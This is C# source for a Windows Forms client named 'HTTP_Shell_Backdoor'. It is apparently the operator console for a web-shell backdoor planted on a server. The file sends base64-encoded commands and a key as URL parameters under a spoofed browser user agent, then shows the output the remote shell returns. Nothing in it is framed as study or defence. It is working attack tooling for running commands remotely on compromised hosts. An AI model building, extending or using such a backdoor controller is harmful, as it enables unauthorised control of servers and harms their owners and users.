using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

namespace HTTP_Shell_Backdoor
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void groupBox4_Enter(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            output_richbox.Enabled = false;
            cmd_textbox.Enabled = false;
            execute_button.Enabled = false;
        }

        private void connect_button_Click(object sender, EventArgs e)
        {
            try
            {
                HttpRequest request = new HttpRequest();
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
                var command_encrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes(cmd_textbox.Text));
                var key_encrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes(key_textbox.Text));
                string post_data = "?key=" + key_encrypted + "&command=" + command_encrypted;
                var response = request.Get(url_textbox.Text+post_data.ToString()).ToString();
                if (response.Contains("status\":\"success\",\"output\":\""))
                {
                    status_text.ForeColor = Color.Green;
                    status_text.Text = "Connected";
                    output_richbox.Enabled = true;
                    cmd_textbox.Enabled = true;
                    execute_button.Enabled = true;
                }else if(response.Contains("incorrect key"))
                {
                    status_text.ForeColor = Color.Orange;
                    status_text.Text = "Incorrect Key";
                }
                else
                {
                    status_text.ForeColor = Color.Red;
                    status_text.Text = "Error";
                }
            }
            catch(Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                status_text.ForeColor = Color.Red;
                status_text.Text = "Error";
            }
        }

        private void execute_button_Click(object sender, EventArgs e)
        {
            if(status_text.Text == "Connected")
            {
                try
                {
                    HttpRequest request = new HttpRequest();
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
                    var command_encrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes(cmd_textbox.Text));
                    var key_encrypted = Convert.ToBase64String(Encoding.UTF8.GetBytes(key_textbox.Text));
                    string post_data = "?key=" + key_encrypted + "&command=" + command_encrypted;
                    var response = request.Get(url_textbox.Text + post_data.ToString()).ToString();
                    if (response.Contains("status\":\"success\",\"output\":\""))
                    {
                        status_text.ForeColor = Color.Green;
                        status_text.Text = "Connected";
                        output_richbox.Text += JObject.Parse(response)["output"].ToString();
                    }
                    else if (response.Contains("incorrect key"))
                    {
                        status_text.ForeColor = Color.Orange;
                        status_text.Text = "Incorrect Key";
                    }
                    else
                    {
                        status_text.ForeColor = Color.Red;
                        status_text.Text = "Error";
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.ToString());
                    status_text.ForeColor = Color.Red;
                    status_text.Text = "Error";
                }
            }
           
        }
    }
}
